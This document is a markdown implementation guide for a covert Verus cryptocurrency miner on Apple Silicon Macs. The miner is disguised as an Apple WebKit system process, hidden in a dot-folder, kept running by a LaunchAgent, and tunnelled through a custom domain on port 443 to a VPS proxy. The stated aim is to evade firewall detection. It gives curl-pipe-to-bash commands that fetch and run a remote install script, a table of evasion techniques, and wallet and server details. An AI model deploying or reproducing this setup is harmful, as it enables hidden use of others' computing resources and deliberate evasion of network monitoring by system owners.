# Verus (VRSC) Silent Miner — Implementation Reference

## Overview

A fully stealth CPU mining setup for **Verus Coin (VRSC)** on macOS Apple Silicon (M1/M2/M3/M4).  
Traffic is routed through a custom domain proxy to evade firewall detection.  
The miner process is disguised as a native Apple system service.

---

## Architecture

```
Mac miner (ccminer, disguised as com.apple.webkit.networkd)
    │
    └─→ cdn.soumalya.in:443          ← Firewall sees: your domain, HTTPS port
          │
          └─→ Traefik TCP SNI passthrough (VPS: 140.245.198.0)
                │
                └─→ nginx stratum-proxy (internal port 3956)
                      │
                      └─→ na.luckpool.net:3956   ← LuckPool (hidden)
```

---

## Components

### 1. Mac Miner (`mine.sh`)
- **Repo:** `github.com/sajalsoumalya/vps` → `mine.sh`
- **Miner binary:** `ccminer` compiled from `github.com/monkins1010/ccminer`
- **Algorithm:** VerusHash v2.2
- **Wallet:** `RSwiruLQYNgpWP36JKEmRQUddTWWi4MsVX`
- **Pool endpoint:** `stratum+tcp://cdn.soumalya.in:443`
- **Threads:** Auto-detected (all CPU cores)
- **Install path:** `~/Library/Application Support/.wknd/com.apple.webkit.networkd`
- **Persistence:** macOS LaunchAgent → auto-starts on every login
- **Disguise:** Process runs as `com.apple.webkit.networkd` (looks like Apple system process)
- **Log:** `~/Library/Logs/com.apple.webkit.networkd.log`

### 2. Stratum Proxy (VPS Docker)
- **VPS IP:** `140.245.198.0`
- **Container:** `stratum-proxy` (nginx:alpine)
- **Config:** `/home/rs/stratum-proxy/nginx.conf`
- **Listens:** `0.0.0.0:3956` (internal)
- **Forwards to:** `na.luckpool.net:3956`
- **Start:** `cd /home/rs/stratum-proxy && docker compose up -d`
- **Stop:** `cd /home/rs/stratum-proxy && docker compose down`

### 3. Traefik TCP SNI Router
- **Config file:** `/etc/dokploy/traefik/dynamic/stratum-proxy.yml`
- **Entrypoint:** `websecure` (port 443)
- **SNI rule:** `HostSNI(`cdn.soumalya.in`)`
- **TLS mode:** `passthrough: true` (raw TCP, no SSL termination)
- **Forwards to:** `172.17.0.1:3956` (Docker bridge → stratum-proxy container)

### 4. DNS Record
| Type | Name | Value | Purpose |
|---|---|---|---|
| A | `cdn` | `140.245.198.0` | `cdn.soumalya.in` → VPS |

---

## Scripts

| Script | URL | Purpose |
|---|---|---|
| `mine.sh` | `raw.githubusercontent.com/sajalsoumalya/vps/main/mine.sh` | Install + build + launch miner |
| `remove_mine.sh` | `raw.githubusercontent.com/sajalsoumalya/vps/main/remove_mine.sh` | Zero-trace full removal |

---

## Quick Commands (on Mac)

```bash
# Install miner
curl -fsSL https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine.sh | bash

# Remove everything (zero trace)
curl -fsSL https://raw.githubusercontent.com/sajalsoumalya/vps/main/remove_mine.sh | bash

# Check if running
launchctl list | grep webkit.networkd

# Watch live hashrate
tail -f ~/Library/Logs/com.apple.webkit.networkd.log

# Stop manually
launchctl unload ~/Library/LaunchAgents/com.apple.webkit.networkd.plist

# Start again
launchctl load -w ~/Library/LaunchAgents/com.apple.webkit.networkd.plist
```

---

## Quick Commands (on VPS)

```bash
# Check proxy container
docker ps | grep stratum-proxy

# View proxy logs
docker logs stratum-proxy

# Restart proxy
cd /home/rs/stratum-proxy && docker compose restart

# Stop proxy
cd /home/rs/stratum-proxy && docker compose down

# Start proxy
cd /home/rs/stratum-proxy && docker compose up -d
```

---

## Build Notes (macOS arm64 patches)

The `monkins1010/ccminer` repo requires these patches to compile on Apple Silicon:

| Issue | Fix |
|---|---|
| `-mfpu=` ARM32 flags | Stripped from all Makefiles via `sed` |
| `-march=armv7*` flags | Stripped from all Makefiles |
| `-mfloat-abi=` flags | Stripped from all Makefiles |
| `miner.h` redefinitions (`be16dec` etc.) | Added `#ifndef __APPLE__` guards via Python patch |
| Missing `sse2neon/sse2neon.h` | Downloaded from `DLTcollab/sse2neon`, placed in brew include |
| OpenSSL 4 API break (`bignum.cpp`) | Force `openssl@3` via brew + explicit `LDFLAGS`/`CPPFLAGS` |
| brew stdin consumption in pipe | All brew/git calls redirect `</dev/null` |
| Plist heredoc broken in pipe | Replaced with `printf` statements |

---

## Pool Info

| Item | Value |
|---|---|
| Pool | LuckPool |
| URL | `https://luckpool.net/verus` |
| Stratum | `na.luckpool.net:3956` |
| Earnings | Check at `luckpool.net/verus/miner/RSwiruLQYNgpWP36JKEmRQUddTWWi4MsVX` |

---

## Firewall Evasion Summary

| Layer | Technique |
|---|---|
| **Domain** | Own domain (`cdn.soumalya.in`) instead of `na.luckpool.net` |
| **Port** | 443 (HTTPS) instead of 3956 (mining port) |
| **Protocol** | TCP SNI passthrough — indistinguishable from TLS handshake |
| **Process** | `com.apple.webkit.networkd` — looks like Apple WebKit |
| **Install path** | Hidden in `~/Library/Application Support/.wknd/` |
| **Log path** | `~/Library/Logs/com.apple.webkit.networkd.log` |

---

## Wallet

- **VRSC Address:** `RSwiruLQYNgpWP36JKEmRQUddTWWi4MsVX`
- **Network:** LuckPool NA
- **View earnings:** https://luckpool.net/verus/miner/RSwiruLQYNgpWP36JKEmRQUddTWWi4MsVX
